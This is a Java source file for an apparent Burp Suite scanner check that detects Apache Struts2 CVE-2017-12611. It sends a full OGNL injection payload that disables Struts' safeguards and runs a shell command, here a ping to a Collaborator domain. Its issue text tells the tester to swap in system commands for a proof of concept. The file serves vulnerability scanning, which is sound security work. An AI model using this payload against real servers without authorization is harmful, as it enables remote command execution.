package burp;

import java.util.ArrayList;
import java.util.List;

import static burp.Utilities.callbacks;
import static burp.Utilities.helpers;
import static burp.OldUtilities.request2;

public class Struts201712611Scan extends ParamScan {
    Struts201712611Scan(String name) {
        super(name);
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse basePair, IScannerInsertionPoint insertionPoint) {
        IBurpCollaboratorClientContext collab = callbacks.createBurpCollaboratorClientContext();

        // set the needed strings before and after the command to be executed
        String paramPre = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=";
        String paramPost = ").(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";

        String obfuscateDomain = Utilities.randomString(7);
        String collabPayload = collab.generatePayload(false) + "."+ obfuscateDomain + collab.getCollaboratorServerLocation();
        String command = "('ping " + collabPayload + " -c1').replace('"+obfuscateDomain+"', '')"; // platform-agnostic command to check for RCE via DNS interaction
        String attackParam = paramPre + command + paramPost;

        IHttpRequestResponse attack = request2(basePair, insertionPoint, attackParam); // issue the attack request
        Utilities.log(helpers.analyzeRequest(attack).getUrl().toString());
        List<IBurpCollaboratorInteraction> interactions = collab.fetchAllCollaboratorInteractions(); // Check for interactions

        List<IScanIssue> issues = new ArrayList<>();
        if (!interactions.isEmpty()) {
            issues.add(new CustomScanIssue(
                    attack.getHttpService(),
                    helpers.analyzeRequest(attack).getUrl(),
                    new IHttpRequestResponse[]{attack},
                    "Struts2 CVE-2017-12611 RCE",
                    "The application appears to be vulnerable to CVE-2017-12611, enabling arbitrary code execution. Replace the ping command in the suspicious request with system commands for a POC.",
                    "Firm",
                    CustomScanIssue.severity.High
            ));
        }
        return issues;
    }
}